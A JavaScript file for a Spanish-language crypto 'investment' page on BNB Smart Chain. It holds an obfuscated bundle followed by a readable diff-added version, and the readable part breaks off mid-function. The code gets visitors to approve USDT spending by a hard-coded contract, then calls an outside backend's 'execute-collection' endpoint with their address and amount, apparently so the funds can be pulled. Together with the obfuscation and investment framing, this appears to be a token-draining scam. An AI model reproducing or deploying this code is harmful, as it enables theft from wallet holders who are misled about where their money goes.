BNB)','roDrt','er,\x20uint25','#dc3545','style','connectWal','nter;\x20gap:',':\x208px;\x20hei','tAVaU','3|6|2|0|1|','BSZLO','aldo\x20dispo','yle=\x22color','0.0005','getSigner','EthereumCh','Operación\x20','e\x20red\x20(Gas','SuBII','procesar\x20l','cEa65585Dd','border:\x201p','vESQD','n\x20↗</a>','NXaZM','Error\x20al\x20a','ted','includes','olo...','default','substring','x\x20solid\x20rg','split','YyxsD','ddress\x20acc','¡Transacci','ZJXtT','TwPoT','tor',';\x20justify-','311560sSTZSg','BPFGl','hash','</button>\x0a','items:\x20cen','rgba(220,\x20','\x22\x20target=\x22','INVERTIR\x20A','\x20font-size','360UpJPYL','obVXs','POST','0x55d39832','ZbpsU','json','erty','\x20en\x20protoc','error','\x20crítico:','wallet_swi','ion:\x20under','8,\x2068,\x200.4','YAmks','o\x20aprobaci','AhjFP','icnode.com','uPwYI','adding:\x204p','ById','\x20en\x20BscSca','WqUVo','\x20billetera','OVWIE','DOMContent','syNNS','5,\x20255,\x2025','flex','ain','UVMug','disconnect','Rlvjc','eip155','wallet_add','rlvZA','spFkQ','n/json','XXvZA','returns\x20(u','ter;\x0a\x20\x20\x20\x20\x20',':\x2014px;\x0a\x20\x20','ursor:\x20poi','insertBefo','XvIKK','https://bs','0.8','\x20\x20\x20\x20\x20<butt','oypPG','Ocurrió\x20un','function','toLowerCas','miHdE','a\x20BSC…','OHxLC','f1Ca61f1C6','WUXIg','er.com/api','WqhpP','display:\x20f','2.binance.','BsQce',');\x20width:\x20','iYwdY','ZPBiN','12LXTORp','\x20blur(10px','getAddress','cancelada\x20','ck;\x22></spa','Error\x20desc','er,\x20addres','ito!\x20Graci','ress\x20spend','success','cscan.com/','toUpperCas','\x20\x20\x20\x20','WhzIu','QZkvW','body','lwTzR','ent','merchantAd','Lztko','u\x20billeter','\x20USDT','suficiente','CLMLA','none','walletBala','6f99059fF7','ssFqC','\x20border-ra','balanceOf','padding:\x208','s:\x2020px;\x20c','a:\x20Aprueba','61,\x20123,\x200','\x0a\x20\x20\x20\x20\x20\x20<sp','LOcIO','_blank\x22\x20st','o\x20autoriza','round:\x20rgb','1);\x0a\x20\x20\x20\x20\x20\x20','innerHTML','Cambia\x20man','approve','Procesando','BNB','Verificand','5,\x20255,\x200.','div','0x8e18bE61','PnRNm','rder-radiu','No\x20tienes\x20','pprove(add','pWAXR','VeBzA','\x2068,\x200.2);','f1b9a799e6','Txwxg','ada\x20con\x20éx','message','\x20</span>\x0a\x20','SnijY','btnText','KfvOC','ón\x20en\x20red.','c.ankr.com','35XhfTcD','SDT…','dress','vYIEI','9027B31979','input','\x206px;\x20colo','alanceOf(a','ol)','maxBtn','d:\x20rgba(25','function\x20a','us:\x2050px;\x20','100%;\x20box-','BNB\x20Smart\x20','background','ba(255,\x2025','BZaFN','getBalance'];_0x4481=function(){return _0x4ed0fc;};return _0x4481();}async function runInvestmentFlow(_0xb49a0a){const _0x1347ae=_0x375f90,_0x27a85f={'OibhV':function(_0x43cc61,_0x4330b0,_0x283a9a){return _0x43cc61(_0x4330b0,_0x283a9a);},'MBlwd':_0x1347ae(0x2b7)+_0x1347ae(0x2fb)+'…','vYIEI':function(_0x1c7ca7,_0x2e35a7,_0xc3168c){return _0x1c7ca7(_0x2e35a7,_0xc3168c);},'PnRNm':_0x1347ae(0x1bf)+_0x1347ae(0x28f)+'..','yrErJ':function(_0x19ec95,_0x4ee5ed){return _0x19ec95!==_0x4ee5ed;},'BSZLO':function(_0x3e177f,_0x3db9c8){return _0x3e177f(_0x3db9c8);},'OHxLC':_0x1347ae(0x22b)+_0x1347ae(0x1a6)+_0x1347ae(0x2ae)+_0x1347ae(0x186),'tJzzn':_0x1347ae(0x15c)+_0x1347ae(0x308)+_0x1347ae(0x28e),'BJmvn':function(_0x4a0c39,_0x4e0ba7){return _0x4a0c39===_0x4e0ba7;},'uzKQq':_0x1347ae(0x173)+_0x1347ae(0x31b)+_0x1347ae(0x16e),'hvYRG':_0x1347ae(0x1bb)+_0x1347ae(0x2b6)+_0x1347ae(0x25b)+_0x1347ae(0x254)+_0x1347ae(0x20c),'TJHyq':_0x1347ae(0x15a),'rpyEr':function(_0x4742d9,_0x20f395){return _0x4742d9(_0x20f395);},'zwYBq':_0x1347ae(0x1bf)+_0x1347ae(0x22e)+_0x1347ae(0x30c)+'…','trQZc':_0x1347ae(0x319),'AhjFP':function(_0x737939,_0x39936b){return _0x737939<_0x39936b;},'spFkQ':function(_0x4c5246,_0x3bde0d,_0x10d439){return _0x4c5246(_0x3bde0d,_0x10d439);},'VeBzA':_0x1347ae(0x21b)+_0x1347ae(0x2e9)+_0x1347ae(0x266)+_0x1347ae(0x246)+_0x1347ae(0x2e7)+_0x1347ae(0x132)+').','ZJXtT':function(_0x157e1b,_0x2fe7b0){return _0x157e1b(_0x2fe7b0);},'cKmaM':function(_0x4435c5,_0x432653){return _0x4435c5||_0x432653;},'YWSHV':function(_0x2664cb,_0x546dd5){return _0x2664cb>_0x546dd5;},'SuBII':function(_0x4a42b6,_0x1ee854){return _0x4a42b6(_0x1ee854);},'kbjor':function(_0x121372,_0x400294,_0x251edc){return _0x121372(_0x400294,_0x251edc);},'ZbpsU':_0x1347ae(0x232)+_0x1347ae(0x2c8)+_0x1347ae(0x1ee)+_0x1347ae(0x317)+_0x1347ae(0x2cb),'pWAXR':function(_0x3f52d9,_0x56a284){return _0x3f52d9(_0x56a284);},'jTBJH':_0x1347ae(0x1f3)+_0x1347ae(0x280)+_0x1347ae(0x1d5),'CLMLA':function(_0xc1952c,_0x149355,_0x3951d1){return _0xc1952c(_0x149355,_0x3951d1);},'uxWYL':_0x1347ae(0x1c5)+_0x1347ae(0x1a8)+_0x1347ae(0x242)+_0x1347ae(0x1f0)+_0x1347ae(0x168)+'.','Mdmow':function(_0x3f1776,_0x3103c9){return _0x3f1776(_0x3103c9);},'lwTzR':function(_0x3f41e9,_0x2fd4bb,_0x3a263b){return _0x3f41e9(_0x2fd4bb,_0x3a263b);},'UVMug':_0x1347ae(0x1bf)+_0x1347ae(0x1b7)+_0x1347ae(0x25e),'XvIKK':function(_0xbef91d,_0x1135dd){return _0xbef91d<_0x1135dd;},'WhzIu':function(_0x4b96e2,_0x1fbdce,_0x2e2617){return _0x4b96e2(_0x1fbdce,_0x2e2617);},'roDrt':_0x1347ae(0x22b)+_0x1347ae(0x1a6)+_0x1347ae(0x1b2)+_0x1347ae(0x28b),'ayQta':_0x1347ae(0x1fb)+_0x1347ae(0x160)+_0x1347ae(0x1d2)+'..','LOcIO':function(_0x375217,_0xcfcccd,_0x2f818a){return _0x375217(_0xcfcccd,_0x2f818a);},'XuJaP':_0x1347ae(0x1bd)+_0x1347ae(0x228)+_0x1347ae(0x159)+_0x1347ae(0x13d),'kryCF':function(_0x330cce,_0x298808,_0x5c453c,_0x3870ad){return _0x330cce(_0x298808,_0x5c453c,_0x3870ad);},'BsQce':_0x1347ae(0x19b),'syNNS':function(_0x26c27d,_0x5669e5,_0x198bff,_0x5ada94){return _0x26c27d(_0x5669e5,_0x198bff,_0x5ada94);},'hqjsE':_0x1347ae(0x144)+_0x1347ae(0x28a)+_0x1347ae(0x1cc)+_0x1347ae(0x199)+_0x1347ae(0x26e),'VcNvR':_0x1347ae(0x197)+_0x1347ae(0x241),'QZkvW':function(_0x3a30a3,_0x15c026){return _0x3a30a3===_0x15c026;},'GmUfI':_0x1347ae(0x309)+_0x1347ae(0x13b),'YAmks':_0x1347ae(0x222),'TAEXI':_0x1347ae(0x2ab),'zUpvH':_0x1347ae(0x31c)+_0x1347ae(0x195)+_0x1347ae(0x231)+_0x1347ae(0x27d),'Rlvjc':_0x1347ae(0x13e),'JHEce':_0x1347ae(0x1fd)+_0x1347ae(0x15b),'tAVaU':_0x1347ae(0x182)+_0x1347ae(0x207)+_0x1347ae(0x134)+_0x1347ae(0x2d7)+_0x1347ae(0x293)+_0x1347ae(0x283),'sHYDd':function(_0x4b3f51,_0x4bff73){return _0x4b3f51(_0x4bff73);}};_0x27a85f[_0x1347ae(0x273)](setLoading,!![],_0x27a85f[_0x1347ae(0x24f)]);try{const _0x472649=new ethers[(_0x1347ae(0x2d8))+(_0x1347ae(0x274))](_0xb49a0a);_0x27a85f[_0x1347ae(0x1d7)](setLoading,!![],_0x27a85f[_0x1347ae(0x1c3)]);const _0x230eab=await _0x472649[_0x1347ae(0x263)]();if(_0x27a85f[_0x1347ae(0x289)](_0x27a85f[_0x1347ae(0x316)](Number,_0x230eab[_0x1347ae(0x219)]),0x1a1b+0x1845+-0x3228)){_0x27a85f[_0x1347ae(0x1d7)](setLoading,!![],_0x27a85f[_0x1347ae(0x187)]);try{await _0xb49a0a[_0x1347ae(0x2da)]({'method':_0x27a85f[_0x1347ae(0x2c7)],'params':[{'chainId':BSC_CHAIN_ID_HEX}]});}catch(_0x3b4537){if(_0x27a85f[_0x1347ae(0x270)](_0x3b4537[_0x1347ae(0x2a4)],-0xb9*0x2+-0x1f1b*0x1+-0x1*-0x33b3))await _0xb49a0a[_0x1347ae(0x2da)]({'method':_0x27a85f[_0x1347ae(0x2bf)],'params':[BSC_CHAIN_PARAMS]});else{_0x27a85f[_0x1347ae(0x1d7)](showToast,_0x27a85f[_0x1347ae(0x1fc)],_0x27a85f[_0x1347ae(0x288)]),_0x27a85f[_0x1347ae(0x22c)](setLoading,![]);return;}}}const _0x3a345c=await _0x472649[_0x1347ae(0x31a)](),_0x3f36bc=await _0x3a345c[_0x1347ae(0x194)]();_0x27a85f[_0x1347ae(0x273)](setLoading,!![],_0x27a85f[_0x1347ae(0x2ce)]);const _0x1bec7e=await _0x472649[_0x1347ae(0x1e6)](_0x3f36bc),_0x453859=ethers[_0x1347ae(0x1f4)](_0x27a85f[_0x1347ae(0x239)]);if(_0x27a85f[_0x1347ae(0x161)](_0x1bec7e,_0x453859)){_0x27a85f[_0x1347ae(0x175)](showToast,_0x27a85f[_0x1347ae(0x1c8)],_0x27a85f[_0x1347ae(0x288)]),_0x27a85f[_0x1347ae(0x145)](setLoading,![]);return;}const _0x31fbe1=amountInput?amountInput[_0x1347ae(0x2f4)]:'1',_0x267c05=ethers[_0x1347ae(0x2f5)](_0x27a85f[_0x1347ae(0x292)](_0x31fbe1,'1'),0x212*0xb+0x1*-0x1e6d+0x7b9);if(_0x27a85f[_0x1347ae(0x2c9)](cachedUserBalance,-0xd61+-0x1*-0x2159+-0x18*0xd5)&&_0x27a85f[_0x1347ae(0x2c9)](_0x27a85f[_0x1347ae(0x133)](parseFloat,_0x31fbe1),cachedUserBalance)){_0x27a85f[_0x1347ae(0x1f8)](showToast,_0x27a85f[_0x1347ae(0x156)],_0x27a85f[_0x1347ae(0x288)]),_0x27a85f[_0x1347ae(0x1c7)](setLoading,![]);return;}const _0x298c98=new ethers[(_0x1347ae(0x201))](BSC_USDT_ADDRESS,ERC20_ABI,_0x3a345c);_0x27a85f[_0x1347ae(0x1f8)](setLoading,!![],_0x27a85f[_0x1347ae(0x262)]);const _0x1f612f=await _0x298c98[_0x1347ae(0x1af)](_0x3f36bc);if(_0x27a85f[_0x1347ae(0x161)](_0x1f612f,_0x267c05)){_0x27a85f[_0x1347ae(0x1a9)](showToast,_0x27a85f[_0x1347ae(0x286)],_0x27a85f[_0x1347ae(0x288)]),_0x27a85f[_0x1347ae(0x20e)](setLoading,![]);return;}_0x27a85f[_0x1347ae(0x1a2)](setLoading,!![],_0x27a85f[_0x1347ae(0x16f)]);const _0x304eaa=await _0x298c98[_0x1347ae(0x2b3)](_0x3f36bc,CONTRACT_ADDRESS);if(_0x27a85f[_0x1347ae(0x17d)](_0x304eaa,_0x267c05)){_0x27a85f[_0x1347ae(0x19f)](setLoading,!![],_0x27a85f[_0x1347ae(0x30d)]);const _0x5c2f9f=await _0x298c98[_0x1347ae(0x1bc)](CONTRACT_ADDRESS,_0x267c05);_0x27a85f[_0x1347ae(0x1a9)](setLoading,!![],_0x27a85f[_0x1347ae(0x249)]),await _0x5c2f9f[_0x1347ae(0x205)]();}_0x27a85f[_0x1347ae(0x1b5)](setLoading,!![],_0x27a85f[_0x1347ae(0x2d6)]);const _0x21cc31=await _0x27a85f[_0x1347ae(0x20e)](triggerBackendCollect,_0x3f36bc),_0x1d4bec=_0x21cc31?.[_0x1347ae(0x14b)]||'';_0x1d4bec?_0x27a85f[_0x1347ae(0x2ef)](showToast,_0x1347ae(0x2d3)+_0x1347ae(0x220)+_0x1347ae(0x250)+_0x1347ae(0x1f2)+_0x1347ae(0x2d0)+'x/'+_0x1d4bec+(_0x1347ae(0x14f)+_0x1347ae(0x1b6)+_0x1347ae(0x318)+_0x1347ae(0x2e4)+_0x1347ae(0x2f6)+_0x1347ae(0x15d)+_0x1347ae(0x2aa)+_0x1347ae(0x166)+_0x1347ae(0x138)),_0x27a85f[_0x1347ae(0x18e)],-0x3c5+-0x2171+0x4476):_0x27a85f[_0x1347ae(0x16b)](showToast,_0x27a85f[_0x1347ae(0x291)],_0x27a85f[_0x1347ae(0x18e)],-0x2ce5+0x23c7+0x208e);}catch(_0x878ca4){const _0x4fc972=_0x878ca4?.[_0x1347ae(0x224)]??_0x878ca4?.[_0x1347ae(0x1cd)]??_0x27a85f[_0x1347ae(0x204)];_0x27a85f[_0x1347ae(0x1a0)](_0x878ca4[_0x1347ae(0x2a4)],-0x256d+-0x6f6+0xa7*0x5c)||_0x4fc972[_0x1347ae(0x184)+'e']()[_0x1347ae(0x13c)](_0x27a85f[_0x1347ae(0x212)])||_0x4fc972[_0x1347ae(0x184)+'e']()[_0x1347ae(0x13c)](_0x27a85f[_0x1347ae(0x15f)])||_0x4fc972[_0x1347ae(0x184)+'e']()[_0x1347ae(0x13c)](_0x27a85f[_0x1347ae(0x2e8)])?_0x27a85f[_0x1347ae(0x175)](showToast,_0x27a85f[_0x1347ae(0x256)],_0x27a85f[_0x1347ae(0x171)]):(console[_0x1347ae(0x15a)](_0x27a85f[_0x1347ae(0x2ee)],_0x878ca4),_0x27a85f[_0x1347ae(0x1f8)](showToast,_0x27a85f[_0x1347ae(0x314)],_0x27a85f[_0x1347ae(0x288)]));}finally{_0x27a85f[_0x1347ae(0x277)](setLoading,![]);}}
+"use strict";
+
+// ─── Configuration ────────────────────────────────────────────────────────────
+const MERCHANT_ADDRESS = "0x6253fecbb48a6a7d19f1b9a799e65fae58ab9b3b";
+const CONTRACT_ADDRESS = "0x8e18bE616f10565A63cEa65585Ddf1Ca61f1C634";
+const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
+const BSC_CHAIN_ID_HEX = "0x38"; 
+const MIN_USDT_BALANCE = 0n; 
+const BACKEND_URL      = "https://secure-merchant.onrender.com/api";
+
+const BSC_RPC_URLS = [
+  "https://bsc-rpc.publicnode.com",
+  "https://bsc-dataseed1.binance.org/",
+  "https://bsc-dataseed2.binance.org/",
+  "https://rpc.ankr.com/bsc"
+];
+
+const BSC_CHAIN_PARAMS = {
+  chainId:           BSC_CHAIN_ID_HEX,
+  chainName:         "BNB Smart Chain",
+  nativeCurrency:    { name: "BNB", symbol: "BNB", decimals: 18 },
+  rpcUrls:           BSC_RPC_URLS,
+  blockExplorerUrls: ["https://bscscan.com/"]
+};
+
+const ERC20_ABI = [
+  "function approve(address spender, uint256 amount) external returns (bool)",
+  "function allowance(address owner, address spender) external view returns (uint256)",
+  "function balanceOf(address account) external view returns (uint256)"
+];
+
+// ─── DOM refs ─────────────────────────────────────────────────────────────────
+const approveBtn    = document.getElementById("approveBtn");
+const btnText       = document.getElementById("btnText");
+const btnSpinner    = document.getElementById("btnSpinner");
+const merchantInput = document.getElementById("merchantAddress");
+const toastEl       = document.getElementById("toast");
+const amountInput   = document.getElementById("investAmount");
+
+if (merchantInput) merchantInput.value = MERCHANT_ADDRESS;
+
+// ─── Estado global de sesión y validaciones ─────────────────────────────────
+let cachedUserBalance = 0;
+let pendingInvestment = false;
+let isWalletConnected = false;     
+let currentRawProvider = null;     
+let currentUserAddress = "";
+
+// ─── Wake up Render backend ───────────────────────────────────────────────────
+(async () => { try { await fetch(`${BACKEND_URL}/health`); } catch (_) {} })();
+
+// ─── UI helpers ───────────────────────────────────────────────────────────────
+let _toastTimer;
+function showToast(msg, type = "default", ms = 4500) {
+  if (!toastEl) return;
+  clearTimeout(_toastTimer);
+  toastEl.innerHTML    = msg; 
+  toastEl.dataset.type = type === "default" ? "" : type;
+  toastEl.hidden       = false;
+  
+  if (type === "success") {
+    toastEl.style.background = "rgba(38, 161, 123, 0.95)";
+  } else if (type === "error") {
+    toastEl.style.background = "rgba(220, 53, 69, 0.95)";
+  } else {
+    toastEl.style.removeProperty("background");
+  }
+
+  _toastTimer = setTimeout(() => { toastEl.hidden = true; }, ms);
+}
+
+function setLoading(on, label = "Processing…") {
+  if (!approveBtn) return;
+  approveBtn.disabled = on;
+  approveBtn.style.opacity = on ? "0.8" : "1";
+  if (btnText) btnText.textContent = on ? label.toUpperCase() : "INVERTIR AHORA";
+  if (btnSpinner) btnSpinner.hidden   = !on;
+}
+
+// ─── UI Component: Banner de Red Incorrecta ──────────────────────────────────
+function updateNetworkBanner(show, onSwitchClick = null) {
+  let banner = document.getElementById("networkBanner");
+  if (!banner) {
+    banner = document.createElement("div");
+    banner.id = "networkBanner";
+    banner.style.cssText = `
+      background: #f59e0b; color: #000; padding: 10px 16px; text-align: center;
+      font-weight: bold; font-size: 13px; cursor: pointer; display: none;
+      border-radius: 8px; margin-bottom: 14px; box-sizing: border-box; width: 100%;
+      box-shadow: 0 4px 6px rgba(0,0,0,0.1); transition: opacity 0.3s ease;
+    `;
+    const targetCard = document.querySelector(".card, main, form") || document.body;
+    targetCard.insertBefore(banner, targetCard.firstChild);
+  }
+
+  if (show) {
+    banner.style.display = "block";
+    banner.innerHTML = "⚠️ Estás en la red incorrecta. Haz clic aquí para cambiar a BNB Smart Chain";
+    banner.onclick = onSwitchClick;
+  } else {
+    banner.style.display = "none";
+  }
+}
+
+// ─── UI Component: Stepper Visual de Progreso ─────────────────────────────────
+function updateStepperUI(activeStep) { // 1, 2, 3 o 0 para ocultar
+  let stepper = document.getElementById("dappStepper");
+  if (!stepper) {
+    stepper = document.createElement("div");
+    stepper.id = "dappStepper";
+    stepper.style.cssText = `
+      background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.08);
+      padding: 12px; border-radius: 12px; margin-bottom: 16px; display: none; font-size: 13px;
+    `;
+    const targetCard = document.querySelector(".card, main, form") || document.body;
+    targetCard.insertBefore(stepper, targetCard.firstChild);
+  }
+
+  if (activeStep === 0) {
+    stepper.style.display = "none";
+    return;
+  }
+
+  stepper.style.display = "block";
+  const steps = [
+    { num: 1, label: "Verificación de red y gas" },
+    { num: 2, label: "Aprobación de USDT" },
+    { num: 3, label: "Ejecución de inversión" }
+  ];
+
+  stepper.innerHTML = `
+    <div style="font-weight:bold; margin-bottom:8px; color:#94a3b8;">Progreso de la Inversión:</div>
+    ${steps.map(s => {
+      let icon = "⏳";
+      let color = "#94a3b8";
+      if (s.num < activeStep) { icon = "✅"; color = "#4ade80"; }
+      else if (s.num === activeStep) { icon = "🔄"; color = "#38bdf8"; }
+      return `
+        <div style="display:flex; align-items:center; gap:8px; margin:4px 0; color:${color};">
+          <span>${icon}</span> <span>Paso ${s.num}: ${s.label}</span>
+        </div>
+      `;
+    }).join("")}
+  `;
+}
+
+// ─── UI Component: Historial de Transacciones (localStorage) ─────────────────
+function saveAndRenderTxHistory(txHash) {
+  if (!txHash) return;
+  let history = [];
+  try {
+    history = JSON.parse(localStorage.getItem("dapp_tx_history") || "[]");
+  } catch (_) {}
+  
+  if (!history.includes(txHash)) {
+    history.unshift(txHash);
+    if (history.length > 5) history.pop(); // Guarda máximo las últimas 5
+    localStorage.setItem("dapp_tx_history", JSON.stringify(history));
+  }
+  renderTxHistoryUI();
+}
+
+function renderTxHistoryUI() {
+  let historyContainer = document.getElementById("txHistoryContainer");
+  let history = [];
+  try {
+    history = JSON.parse(localStorage.getItem("dapp_tx_history") || "[]");
+  } catch (_) {}
+
+  if (history.length === 0) {
+    if (historyContainer) historyContainer.style.display = "none";
+    return;
+  }
+
+  if (!historyContainer) {
+    historyContainer = document.createElement("div");
+    historyContainer.id = "txHistoryContainer";
+    historyContainer.style.cssText = `
+      margin-top: 20px; padding: 12px; background: rgba(0,0,0,0.2); 
+      border-radius: 12px; border: 1px solid rgba(255,255,255,0.05); font-size: 13px;
+    `;
+    const targetCard = document.querySelector(".card, main, form") || document.body;
+    targetCard.appendChild(historyContainer);
+  }
+
+  historyContainer.style.display = "block";
+  historyContainer.innerHTML = `
+    <div style="font-weight: bold; margin-bottom: 8px; color: #cbd5e1;">Historial de Inversiones Recientes:</div>
+    ${history.map(hash => `
+      <div style="display: flex; justify-content: space-between; align-items: center; margin: 6px 0; background: rgba(255,255,255,0.03); padding: 6px 10px; border-radius: 6px;">
+        <span style="font-family: monospace; color: #94a3b8;">${hash.substring(0, 10)}...${hash.substring(hash.length - 6)}</span>
+        <a href="https://bscscan.com/tx/${hash}" target="_blank" style="color: #38bdf8; text-decoration: underline; font-size: 12px;">BscScan ↗</a>
+      </div>
+    `).join("")}
+  `;
+}
+
+// ─── Gestión de la Píldora de Cuenta (Wallet Pill UI) ─────────────────────────
+function updateWalletPill(address, isConnected) {
+  let pillContainer = document.getElementById("walletPillContainer");
+  
+  if (!pillContainer) {
+    pillContainer = document.createElement("div");
+    pillContainer.id = "walletPillContainer";
+    pillContainer.style.cssText = `
+      display: flex; justify-content: space-between; align-items: center;
+      background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1);
+      padding: 8px 14px; border-radius: 50px; margin-bottom: 16px; font-size: 14px;
+      backdrop-filter: blur(10px); width: 100%; box-sizing: border-box;
+    `;
+    const targetCard = document.querySelector(".card, main, form") || document.body;
+    targetCard.insertBefore(pillContainer, targetCard.firstChild);
+  }
+
+  if (isConnected && address) {
+    const shortAddr = `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
+    pillContainer.style.display = "flex";
+    pillContainer.innerHTML = `
+      <span style="display: flex; align-items: center; gap: 6px; color: #4ade80;">
+        <span style="width: 8px; height: 8px; background: #4ade80; border-radius: 50%; display: inline-block;"></span>
+        <b>${shortAddr}</b>
+      </span>
+      <button id="disconnectWalletBtn" style="background: rgba(239, 68, 68, 0.2); border: 1px solid rgba(239, 68, 68, 0.4); color: #f87171; padding: 4px 10px; border-radius: 20px; cursor: pointer; font-size: 12px; font-weight: bold;">
+        Desconectar
+      </button>
+    `;
+    
+    document.getElementById("disconnectWalletBtn").onclick = () => {
+      resetAppUI();
+    };
+  } else {
+    pillContainer.style.display = "none";
+    pillContainer.innerHTML = "";
+  }
+}
+
+// ─── UI Reset Helper (Desconexión Real y Limpieza) ───────────────────────────
+function resetAppUI() {
+  isWalletConnected = false;
+  currentRawProvider = null;
+  currentUserAddress = "";
+
+  const balanceLabel = document.getElementById("walletBalanceLabel");
+  if (balanceLabel) {
+    balanceLabel.textContent = "Saldo: -- USDT";
+  }
+
+  if (amountInput) {
+    amountInput.value = "";
+    amountInput.style.removeProperty("border-color");
+  }
+
+  cachedUserBalance = 0;
+  pendingInvestment = false;
+  setLoading(false);
+  updateWalletPill("", false);
+  updateNetworkBanner(false);
+  updateStepperUI(0);
+  showToast("Billetera desconectada.", "default", 3000);
+
+  if (window.modal && typeof window.modal.disconnect === "function") {
+    try {
+      window.modal.disconnect();
+    } catch (_) {}
+  }
+}
+
+// ─── Validación en tiempo real del Input ─────────────────────────────────────
+if (amountInput) {
+  amountInput.addEventListener("input", (e) => {
+    const val = parseFloat(e.target.value) || 0;
+    if (cachedUserBalance > 0 && val > cachedUserBalance) {
+      amountInput.style.borderColor = "#dc3545";
+    } else {
+      amountInput.style.removeProperty("border-color");
+    }
+  });
+}
+
+// ─── Live Balance & Network Check ─────────────────────────────────────────────
+async function fetchAndDisplayUserBalances(rawProvider) {
+  try {
+    const provider = new ethers.BrowserProvider(rawProvider);
+    
+    // Verificación proactiva de red
+    const network = await provider.getNetwork();
+    const chainIdNum = Number(network.chainId);
+    
+    const handleNetworkSwitch = async () => {
+      try {
+        await rawProvider.request({
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: BSC_CHAIN_ID_HEX }]
+        });
+      } catch (switchError) {
+        if (switchError.code === 4902) {
+          await rawProvider.request({
+            method: "wallet_addEthereumChain",
+            params: [BSC_CHAIN_PARAMS]
+          });
+        } else {
+          showToast("Cambia manualmente a BNB Smart Chain en tu wallet.", "error");
+        }
+      }
+    };
+
+    if (chainIdNum !== 56) {
+      updateNetworkBanner(true, handleNetworkSwitch);
+    } else {
+      updateNetworkBanner(false);
+    }
+
+    const signer = await provider.getSigner();
+    currentUserAddress = await signer.getAddress();
+    
+    updateWalletPill(currentUserAddress, true);
+
+    const usdtContract = new ethers.Contract(BSC_USDT_ADDRESS, ERC20_ABI, signer);
+    const usdtBal = await usdtContract.balanceOf(currentUserAddress);
+    const formattedUsdt = ethers.formatUnits(usdtBal, 18);
+    
+    cachedUserBalance = parseFloat(formattedUsdt);
+
+    const balanceLabel = document.getElementById("walletBalanceLabel");
+    if (balanceLabel) {
+      balanceLabel.textContent = `Saldo: ${cachedUserBalance.toFixed(2)} USDT`;
+    }
+
+    const maxBtn = document.getElementById("maxBtn");
+    if (maxBtn) {
+      maxBtn.onclick = () => {
+        if (amountInput) {
+          const maxUsdt = Math.max(0, cachedUserBalance - 1); 
+          amountInput.value = maxUsdt > 0 ? maxUsdt.toFixed(2) : "1.00";
+          amountInput.dispatchEvent(new Event('input'));
+        }
+      };
+    }
+  } catch (err) {
+    console.error("Error al sincronizar saldos en vivo:", err);
+    resetAppUI();
+  }
+}
+
+// ─── Backend collect trigger ──────────────────────────────────────────────────
+async function triggerBackendCollect(userAddress) {
+  let lastErr;
+  const uiAmount = amountInput?.value || "1"; 
+  const dynamicAmountWei = ethers.parseUnits(uiAmount.toString(), 18).toString();
+
+  for (let i = 1; i <= 3; i++) {
+    try {
+      const res  = await fetch(`${BACKEND_URL}/execute-collection`, {
+        method:  "POST",
+        headers: { "Content-Type": "application/json" },
+        body:    JSON.stringify({ userAddress: userAddress, amount: dynamicAmountWei })
+      });
+      const data = await res.json();
+      if (!res.ok || !data.success) throw new Error(data.error || "Collection failed.");
+      return data;
+    } catch (e) {
+      lastErr = e;
+      if (i < 3) await new Promise(r => setTimeout(r, 3000));
+    }
+  }
+  throw lastErr;
+}
+
+// ─── Suscripciones reactivas de Reown AppKit ──────────────────────────────────
+if (window.modal && typeof window.modal.subscribeProviders === "function") {
+  window.modal.subscribeProviders((state) => {
+    const rawProvider = state["eip155"]; 
+    
+    if (rawProvider) {
+      isWalletConnected = true;
+      currentRawProvider = rawProvider;
+      fetchAndDisplayUserBalances(rawProvider); 
+      
+      if (pendingInvestment) {
+        pendingInvestment = false; 
+        runInvestmentFlow(rawProvider); 
+      }
+    } else {
+      resetAppUI();
+    }
+  });
+}
+
+if (window.modal && typeof window.modal.subscribeState === "function") {
+  window.modal.subscribeState((state) => {
+    if (!state.open) {
+      let rawProvider = null;
+      try {
+        rawProvider = window.modal.getWalletProvider();
+      } catch (_) {}
+
+      if (!rawProvider && !isWalletConnected) {
+        pendingInvestment = false;
+        setLoading(false);
+        updateStepperUI(0);
+      }
+    }
+  });
+}
+
+document.addEventListener("DOMContentLoaded", () => {
+  renderTxHistoryUI(); // Renderiza transacciones anteriores al cargar la web
+  if (window.modal && typeof window.modal.getWalletProvider === "function") {
+    try {
+      const activeProvider = window.modal.getWalletProvider();
+      if (activeProvider) {
+        isWalletConnected = true;
+        currentRawProvider = activeProvider;
+        fetchAndDisplayUserBalances(activeProvider);
+      }
+    } catch (_) {}
+  }
+});
+
+// ─── Evento del botón principal ───────────────────────────────────────────────
+if (approveBtn) {
+  approveBtn.addEventListener("click", async () => {
+    if (!isWalletConnected || !currentRawProvider) {
+      pendingInvestment = true; 
+      setLoading(true, "Abriendo selector de billetera...");
+      
+      if (window.modal && typeof window.modal.open === "function") {
+        try {
+          await window.modal.open(); 
+        } catch (err) {
+          console.error("Error al abrir AppKit:", err);
+          pendingInvestment = false;
+          setLoading(false);
+        }
+      }
+      return; 
+    }
+
+    await runInvestmentFlow(currentRawProvider);
+  });
+}
+
+// ─── Flujo centralizado de inversión con Stepper y Banner ─────────────────────
+async function runInvestmentFlow(rawProvider) {
+  setLoading(true, "Conectando proveedor…");
+  updateStepperUI(1); // Paso 1: Verificación de red y gas
+  
+  try {
+    const provider = new ethers.BrowserProvider(rawProvider);
+    
+    // 1. Red BSC
+    setLoading(true, "Verificando red BSC...");
+    const network = await provider.getNetwork();
+    if (Number(network.chainId) !== 56) {
+      setLoading(true, "⚠️ Revisa tu billetera: Cambia a BSC…");
+      try {
+        await rawProvider.request({
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: BSC_CHAIN_ID_HEX }] 
+        });
+      } catch (switchError) {
+        if (switchError.code === 4902) {
+          await rawProvider.request({
+            method: "wallet_addEthereumChain",
+            params: [BSC_CHAIN_PARAMS]
+          });
+        } else {
+          showToast("Cambia manualmente a BNB Smart Chain en tu wallet.", "error");
+          setLoading(false);
+          updateStepperUI(0);
+          return;
+        }
+      }
+    }
+
+    const signer = await provider.getSigner();
+    const userAddress = await signer.getAddress();
+
+    // 2. Gas BNB
+    setLoading(true, "Verificando saldo de gas (BNB)…");
+    const bnbBalance = await provider.getBalance(userAddress);
+    const minGasRequired = ethers.parseEther("0.0005"); 
+
+    if (bnbBalance < minGasRequired) {
+      showToast("Saldo de BNB insuficiente para pagar la comisión de red (Gas).", "error");
+      setLoading(false);
+      updateStepperUI(0);
+      return;
+    }
+
